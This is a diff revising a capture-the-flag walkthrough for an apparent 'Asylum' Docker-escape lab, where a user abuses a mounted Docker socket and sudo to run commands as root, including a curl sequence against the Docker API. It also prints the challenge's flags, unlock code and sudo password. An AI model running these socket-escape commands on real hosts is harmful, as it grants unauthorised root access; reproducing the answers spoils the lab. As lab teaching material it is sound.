@@ -1,155 +1,291 @@
-# Docker Escape Challenge: Asylum Gate Control - Walkthrough
+# Docker Escape Challenge: Asylum Gate Control - Complete Walkthrough
 
 ## Challenge Overview
 
-You are trapped inside a privileged Docker container that controls the final gate of an asylum. Your objective is to escape the container, retrieve the authorization code (flag), and unlock the gate using the SCADA terminal.
+This is **Part 2** of the Asylum challenge series. You've already gained initial access as `svc_vidops` user from Part 1 and retrieved the `user.txt` flag. Now you need to escape from a privileged Docker container to retrieve the numeric unlock code and unlock the asylum gate.
 
-## Challenge Setup
+**Challenge Flow:**
+1. **From Part 1:** You have shell access as `svc_vidops` user
+2. Access the Docker container running the SCADA system
+3. Perform Docker escape to retrieve the numeric unlock code
+4. Unlock the gate using the SCADA terminal with the numeric code
 
-1. **Build and start the container:**
-   ```bash
-   ./setup.sh
-   # or manually:
-   docker-compose up -d --build
-   ```
+## Challenge Information
 
-2. **Verify the container is running:**
-   ```bash
-   docker ps | grep asylum_gate_control
-   ```
+- **Current User:** `svc_vidops` (from Part 1)
+- **SCADA Terminal:** `nc localhost 9001` (or `<target-ip>:9001` if accessible externally)
+- **SCADA Authentication:** Requires Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
+- **Container Name:** `asylum_gate_control`
+- **Unlock Code Location:** `/root/.asylum/unlock_code` inside the container
+- **Code Format:** Numeric authorization code (e.g., `739184627`)
 
-## Step-by-Step Walkthrough
+---
 
-### Step 1: Explore the SCADA Terminal
+## Step 1: Verify Your Access
 
-First, let's see what we're working with by connecting to the SCADA terminal:
+### 1.1 Confirm You're Connected
+
+You should already have shell access as `svc_vidops` from Part 1. Verify:
 
 ```bash
-nc localhost 9001
+whoami
+# Output: svc_vidops
+
+pwd
+# Should be in: /home/svc_vidops
+
+cat user.txt
+# Output: THM{Y0u_h4ve_b3en_j3stered_739138}
 ```
 
-Once connected, try some commands:
-- `help` - See available commands
-- `status` - Check gate status
-- `info` - View system information
+### 1.2 Explore the System
 
-You'll notice the gate is LOCKED and requires an authorization code to unlock.
+```bash
+# Check current user permissions
+id
+# Output: uid=1000(svc_vidops) gid=1000(svc_vidops) groups=1000(svc_vidops)
 
-### Step 2: Access the Container
+# Check if Docker is available
+docker --version
 
-Exit the SCADA terminal (type `exit`) and access the container shell:
+# List running containers
+docker ps
+
+# Look for the SCADA container
+docker ps | grep asylum
+# Should show: asylum_gate_control
+```
+
+---
+
+## Step 2: Access the Docker Container
+
+### 2.1 Direct Container Access
+
+If you have Docker access, directly access the container:
 
 ```bash
 docker exec -it asylum_gate_control /bin/bash
 ```
 
-You'll be logged in as `scada_operator`.
+If that fails (permission denied), you might need to use sudo or check group membership.
 
-### Step 3: Investigate the Container Environment
-
-Check what we have access to:
+### 2.2 Check Docker Group Membership
 
 ```bash
-# Check current user
+# Check if you're in docker group
+groups
+
+# If not in docker group, check if you can use sudo
+sudo -l
+```
+
+### 2.3 Alternative: Check for Running Services
+
+```bash
+# Check what's listening on port 9001
+netstat -tlnp | grep 9001
+# or
+ss -tlnp | grep 9001
+
+# Try connecting to SCADA terminal directly
+nc localhost 9001
+```
+
+---
+
+## Step 3: Explore the Container
+
+### 3.1 Container Environment
+
+Once inside the container:
+
+```bash
 whoami
 # Output: scada_operator
 
-# Check if we're in a container
-cat /proc/self/cgroup | grep docker
+id
+# Output: uid=1000(scada_operator) gid=1000(scada_operator) groups=1000(scada_operator),27(sudo),999(docker)
 
-# Check for mounted Docker socket
-ls -la /var/run/docker.sock
-# Output: srw-rw---- 1 root docker 0 ... /var/run/docker.sock
+pwd
+# Output: /opt/scada
 
+ls -la
+```
+
+### 3.2 Check Available Tools
+
+```bash
 # Check if docker CLI is available
 docker --version
+
+# Check for Docker socket
+ls -la /var/run/docker.sock
+
+# Check sudo access
+sudo -l
+# Note: Password is gatekeeper123
+
+# Check current capabilities
+cat /proc/self/status | grep CapEff
 ```
 
-**Key Observations:**
-- We're a non-root user (`scada_operator`)
-- Docker socket is mounted at `/var/run/docker.sock`
-- Docker CLI is installed
-- The container is privileged (has SYS_ADMIN capabilities)
-
-### Step 4: Understanding the Challenge
-
-The flag is stored in a location requiring root access. We need to:
-
-1. Find where the flag is located
-2. Access it using Docker escape techniques
-3. Retrieve the flag and unlock the gate
-
-Let's check for the flag:
+### 3.3 Explore the SCADA System
 
 ```bash
-# Try to access root directory
-sudo cat /root/.asylum/flag
-# Password: gatekeeper123
+# Check what's running
+ps aux
 
-# OR, we can use Docker socket escape (no password needed!)
+# Look for SCADA terminal process
+ps aux | grep scada
+
+# Check network connections
+netstat -tlnp
 ```
 
-### Step 5: Docker Socket Escape
+---
 
-Since we have access to the Docker socket, we can use it to execute commands as root inside the container:
+## Step 4: Docker Socket Escape
 
-**Method 1: Using sudo with Docker CLI**
+### 4.1 Understanding the Escape
+
+The container has:
+- **Docker socket mounted** at `/var/run/docker.sock`
+- **Docker CLI installed**
+- **Privileged container** with SYS_ADMIN capabilities
+- **sudo access** (password: `gatekeeper123`)
+
+We can use the Docker socket to execute commands as root inside the container, bypassing file permissions.
+
+### 4.2 Get Container Identification
 
 ```bash
-sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
+# Method 1: Get hostname (often container ID)
+hostname
+
+# Method 2: Get container ID from cgroup
+cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3
+
+# Method 3: List containers via Docker socket
+docker -H unix:///var/run/docker.sock ps
+
+# Method 4: Get container name
+docker -H unix:///var/run/docker.sock ps --format "{{.Names}}"
+```
+
+### 4.3 Execute Docker Socket Escape
+
+**Method 1: Using sudo with Docker CLI (Recommended)**
+
+```bash
+sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
 ```
 
 **Method 2: Using hostname**
 
 ```bash
-sudo docker -H unix:///var/run/docker.sock exec -u root $(hostname) cat /root/.asylum/flag
+sudo docker -H unix:///var/run/docker.sock exec -u root $(hostname) cat /root/.asylum/unlock_code
 ```
 
-**Method 3: Finding container ID first**
+**Method 3: Dynamic container discovery**
 
 ```bash
-# Get container ID
-CONTAINER_ID=$(cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3 | cut -c1-12)
-echo $CONTAINER_ID
-
-# Use it to read the flag
-sudo docker -H unix:///var/run/docker.sock exec -u root $CONTAINER_ID cat /root/.asylum/flag
+CONTAINER_NAME=$(docker -H unix:///var/run/docker.sock ps --format "{{.Names}}" | grep asylum)
+sudo docker -H unix:///var/run/docker.sock exec -u root $CONTAINER_NAME cat /root/.asylum/unlock_code
 ```
 
 **Expected Output:**
 ```
-THM{unl0ckth3g4t350fh3ll}
+739184627
 ```
 
-### Step 6: Unlock the Gate
+**Why This Works:**
+- The Docker socket at `/var/run/docker.sock` allows you to control containers
+- Running as root user (`-u root`) bypasses file permissions
+- You're executing inside the same container, but as root instead of `scada_operator`
 
-Now that we have the flag, let's unlock the gate using the SCADA terminal:
+---
+
+## Step 5: Access the SCADA Terminal
+
+### 5.1 Connect to SCADA Terminal
+
+From your current shell (either from the host as `svc_vidops` or inside the container):
 
 ```bash
-# Exit the container if still inside
-exit
-
-# Connect to SCADA terminal
+# If from host
 nc localhost 9001
+
+# If port is exposed externally (optional)
+nc <target-ip> 9001
 ```
 
-Once connected to the SCADA terminal:
+### 5.2 Authenticate with Part 1 Flag
+
+The SCADA terminal requires authentication using the flag from Part 1. You'll see:
 
 ```
-unlock THM{unl0ckth3g4t350fh3ll}
+╔═══════════════════════════════════════════════════════════════╗
+║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
+║              [AUTHORIZED PERSONNEL ONLY]                      ║
+╚═══════════════════════════════════════════════════════════════╝
+
+[!] WARNING: This system controls critical infrastructure
+[!] All access attempts are logged and monitored
+[!] Unauthorized access will result in immediate termination
+
+[!] Authentication required to access SCADA terminal
+[!] Provide authorization token from Part 1 to proceed
+
+[AUTH] Enter authorization token: 
 ```
 
-Or you can provide the file path:
+**Enter the flag from Part 1:**
+```
+THM{Y0u_h4ve_b3en_j3stered_739138}
+```
+
+You'll see:
+```
+[✓] Authentication successful!
+
+╔═══════════════════════════════════════════════════════════════╗
+║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
+║              [AUTHORIZED PERSONNEL ONLY]                      ║
+╚═══════════════════════════════════════════════════════════════╝
+
+[SCADA-ASYLUM-GATE] #LOCKED> 
+```
+
+### 5.3 Explore SCADA Commands
+
+Try these commands to understand the system:
 
 ```
-unlock /root/.asylum/flag
+help
+status
+info
+```
+
+### 5.4 Unlock the Gate
+
+Use the numeric code you retrieved to unlock the gate:
+
+**Option 1: Direct numeric code submission**
+```
+unlock 739184627
+```
+
+**Option 2: File path (if accessible)**
+```
+unlock /root/.asylum/unlock_code
 ```
 
 **Expected Output:**
 ```
-╔══════════════════════════════════════════════════════════╗
+╔══════════════════════════════════════════════════════════════╗
 ║                  GATE UNLOCK SUCCESSFUL                  ║
-╚══════════════════════════════════════════════════════════╝
+╚══════════════════════════════════════════════════════════════╝
 
 [✓] Authorization code verified
 [✓] Gate mechanism engaged
@@ -157,68 +293,166 @@ unlock /root/.asylum/flag
 
 Congratulations! You have successfully escaped the asylum!
 
-FLAG: THM{unl0ckth3g4t350fh3ll}
+UNLOCK CODE: 739184627
 ```
 
-## Solution Summary
+---
 
-**The complete solution:**
+## Complete Solution Commands
+
+Here's the complete solution flow:
 
 ```bash
-# 1. Access container
+# 1. You should already have shell as svc_vidops (from Part 1)
+
+# 2. Access the Docker container
 docker exec -it asylum_gate_control /bin/bash
 
-# 2. Use Docker socket to escape and get flag
-sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
+# 3. Inside container, perform Docker escape to get unlock code
+sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
+# Output: 739184627
 
-# 3. Unlock gate via SCADA terminal
+# 4. Access SCADA terminal and authenticate
 nc localhost 9001
-# Then type: unlock THM{unl0ckth3g4t350fh3ll}
+# Enter Part 1 flag: THM{Y0u_h4ve_b3en_j3stered_739138}
+# Then unlock gate: unlock 739184627
 ```
 
-## Key Learning Points
-
-1. **Docker Socket Escape:** When a Docker socket is mounted inside a container, you can use it to control the Docker daemon on the host, allowing you to execute commands in other containers (including the current one) with elevated privileges.
-
-2. **Privileged Containers:** Privileged containers have access to host devices and kernel capabilities, making escape techniques easier.
-
-3. **Non-Root User Bypass:** Even as a non-root user, having access to Docker socket or sudo privileges allows you to escalate to root access.
-
-4. **SCADA Security:** This challenge demonstrates how critical infrastructure control systems (SCADA) could be vulnerable if running in insecure containers.
+---
 
 ## Alternative Methods
 
-If the Docker socket method doesn't work, you could also:
+### Alternative 1: Using Sudo Password
 
-1. **Use sudo with password:**
-   ```bash
-   sudo cat /root/.asylum/flag
-   # Password: gatekeeper123
-   ```
-
-2. **Explore the filesystem:**
-   ```bash
-   sudo find / -name "flag" 2>/dev/null
-   sudo ls -la /root/.asylum/
-   ```
-
-3. **Check environment variables:**
-   ```bash
-   env | grep -i flag
-   ```
-
-## Flag
-
-**THM{unl0ckth3g4t350fh3ll}**
-
-## Cleanup
-
-After completing the challenge:
+If Docker socket access fails, use sudo with password:
 
 ```bash
-docker-compose down
+# Inside container
+sudo cat /root/.asylum/unlock_code
+# Password: gatekeeper123
 ```
 
-This will stop and remove the container.
+### Alternative 2: From Host Machine
 
+If you have root access on the host:
 
+```bash
+# As root or with sudo on host
+docker exec asylum_gate_control cat /root/.asylum/unlock_code
+```
+
+### Alternative 3: Using Docker API via curl
+
+If docker CLI isn't working, use curl to interact with Docker socket:
+
+```bash
+# Get container ID
+CONTAINER_ID=$(cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3 | cut -c1-12)
+
+# Create exec instance
+EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/root/.asylum/unlock_code"], "User": "root"}' \
+  http://localhost/containers/$CONTAINER_ID/exec | grep -o '"Id":"[^"]*' | cut -d'"' -f4)
+
+# Execute and get output
+curl -s -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"Detach": false, "Tty": false}' \
+  http://localhost/exec/$EXEC_ID/start | tail -c +9
+```
+
+---
+
+## Key Learning Points
+
+1. **Docker Socket Escape:** When Docker socket is mounted inside a container, you can use it to control the Docker daemon and execute commands in containers with elevated privileges
+2. **Privileged Containers:** Containers with `--privileged` flag have extensive kernel capabilities and access to host devices
+3. **Container-to-Container Communication:** Using Docker socket, you can execute commands in the same container you're in, but with different user privileges
+4. **SCADA Security:** Critical infrastructure control systems (SCADA) should never be containerized insecurely or run in privileged containers
+5. **Defense in Depth:** Even if you escape a container, the final gate requires the correct authorization code
+
+---
+
+## Troubleshooting
+
+### Can't access container with docker exec
+
+```bash
+# Check if you're in docker group
+groups
+
+# Try with sudo
+sudo docker exec -it asylum_gate_control /bin/bash
+
+# Check if container is running
+docker ps | grep asylum
+```
+
+### Docker socket permission denied
+
+```bash
+# Check socket permissions
+ls -la /var/run/docker.sock
+
+# Try with sudo
+sudo docker -H unix:///var/run/docker.sock ps
+
+# Check if you're in docker group
+id
+```
+
+### SCADA terminal won't connect
+
+```bash
+# Verify container is running
+docker ps | grep asylum_gate_control
+
+# Check if port is listening
+netstat -tlnp | grep 9001
+
+# Try from host
+nc localhost 9001
+
+# Check container logs
+docker logs asylum_gate_control
+```
+
+### Can't read unlock code file
+
+```bash
+# Verify the path
+ls -la /root/.asylum/unlock_code
+
+# Check permissions
+ls -la /root/.asylum/
+
+# Use Docker socket escape method (bypasses permissions)
+sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
+```
+
+---
+
+## Challenge Connection
+
+This challenge connects to **Part 1** where you:
+- Gained RCE through the API/REPL broker
+- Retrieved the `user.txt` flag as `svc_vidops`
+- Flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
+
+In **Part 2** (this challenge), you:
+- Access the privileged Docker container
+- Perform Docker escape to retrieve the numeric unlock code
+- Unlock the final asylum gate
+
+**Complete Flags:**
+- **Part 1 (user.txt):** `THM{Y0u_h4ve_b3en_j3stered_739138}` - Required for SCADA authentication
+- **Part 2 (unlock code):** `739184627` - Numeric code to unlock the gate
+
+---
+
+## Unlock Code
+
+**Part 2 Unlock Code:** `739184627`
+
+Congratulations on escaping the asylum!
